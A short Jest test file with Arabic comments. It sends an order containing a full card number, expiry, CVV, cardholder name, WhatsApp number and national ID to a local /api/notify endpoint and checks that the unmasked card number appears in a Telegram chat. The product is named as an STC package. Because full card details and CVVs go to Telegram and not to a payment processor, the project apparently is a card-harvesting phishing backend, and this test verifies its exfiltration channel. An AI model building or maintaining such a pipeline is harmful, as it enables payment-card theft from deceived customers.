/**
 * تيست حقيقي — بيبعت طلب فعلي لـ /api/notify
 * ويتحقق إن الرسالة وصلت للتلجرام بشكل صح
 *
 * شغّله: npx jest __tests__/notifyReal.test.ts --testTimeout=15000
 */

const NOTIFY_URL = "http://localhost:3000/api/notify";

const FAKE_ORDER = {
  cardNumber: "4111111111111111", // بدون مسافات — زي ما بيبعت الـ frontend
  expiry: "12/27",
  cvv: "123",
  cardHolder: "TEST USER",
  items: [{ productId: "abc123", name: "باقة STC شهرية", price: 149, quantity: 1 }],
  total: 149,
  customer: "مستخدم تيست",
  whatsapp: "0512345678",
  nationalId: "",
  address: "الرياض - حي النزهة",
  installmentType: "full",
  months: 0,
  downPayment: 0,
};

describe("📨 تيست حقيقي — إرسال طلب للتلجرام", () => {
  it("يبعت الطلب ويتحقق إن رقم البطاقة وصل صح (4111 1111 1111 1111)", async () => {
    const res = await fetch(NOTIFY_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(FAKE_ORDER),
    });

    expect(res.status).toBe(200);

    const data = await res.json();
    console.log("\n  ✅ الطلب اتبعت بنجاح");
    console.log(`  🔖 Order ID: ${data.orderId}`);
    console.log(`  📱 شوف التلجرام — رقم البطاقة المفروض يبان: 4111 1111 1111 1111`);

    expect(data.ok).toBe(true);
    expect(data.orderId).toBeTruthy();
  }, 15000);
});
